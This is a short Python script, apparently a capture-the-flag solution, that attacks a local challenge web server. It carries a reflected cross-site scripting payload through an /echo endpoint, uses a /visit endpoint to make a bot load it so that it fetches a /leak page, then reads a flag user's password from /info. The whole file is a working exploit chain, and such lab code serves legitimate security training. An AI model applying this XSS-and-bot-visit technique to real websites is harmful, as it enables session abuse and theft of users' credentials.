import requests
import urllib.parse

# Create the XSS payload that will fetch the /leak endpoint.
payload = '<script>fetch("http://challenge.localhost/leak");</script>'

# Use the /echo endpoint to get a URL with the XSS payload.
echo_url = f"http://challenge.localhost:80/echo?echo={payload}"

# Use the /visit endpoint to trigger the XSS payload.
requests.get(f"http://challenge.localhost:80/visit?url={urllib.parse.quote(echo_url)}")

# Retrieve the password using the /info endpoint for the 'flag' user.
response = requests.get("http://challenge.localhost:80/info?user=1")

print(response.text)
